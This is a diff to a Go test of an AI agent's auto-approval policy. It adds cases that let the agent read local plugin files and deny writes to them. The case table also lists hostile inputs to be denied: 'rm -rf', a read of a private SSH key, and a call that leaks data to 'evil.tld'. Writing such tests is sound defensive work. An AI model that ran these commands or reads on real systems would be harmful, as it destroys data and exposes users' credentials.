@@ -21,7 +21,8 @@ func TestAutoModeLocalApprovals(t *testing.T) {
 	h, _ := newTestHost(t)
 	fakeSandbox(h, true)
 	h.Dirs.ConfigHome = filepath.Join(h.Dirs.ProjectDir, ".config", "zemi") // zemi run in $HOME
-	h.Dirs.StateHome = t.TempDir()
+	h.Dirs.StateHome, h.Dirs.DataHome = t.TempDir(), t.TempDir()
+	plugin := filepath.Join(h.Dirs.PluginsRoot(), "local", "p", "init.lua")
 	inside := filepath.Join(h.Dirs.ProjectDir, "main.go")
 	secret := filepath.Join(h.Dirs.ProjectDir, ".env")
 	link := filepath.Join(h.Dirs.ProjectDir, "notes.md")
@@ -71,6 +72,11 @@ func TestAutoModeLocalApprovals(t *testing.T) {
 		{"tool.bash", "rm -rf out", false, false},
 		{"tool.bash", "cat main.go", true, true},
 		{"fs.read", filepath.Join(os.Getenv("HOME"), ".ssh", "id_ed25519"), false, false},
+		// a local plugin reads like the project, and a write loads it everywhere
+		{"fs.read", plugin, true, true},
+		{"tool.bash", "cat " + plugin, true, true},
+		{"fs.write", plugin, false, false},
+		{"fs.write", filepath.Join(h.Dirs.PluginsRoot(), "installed", "p", "init.lua"), false, false},
 		{"net.evil.tld", "https://evil.tld/?d=leak", false, false},
 	} {
 		for _, trusted := range []bool{true, false} {
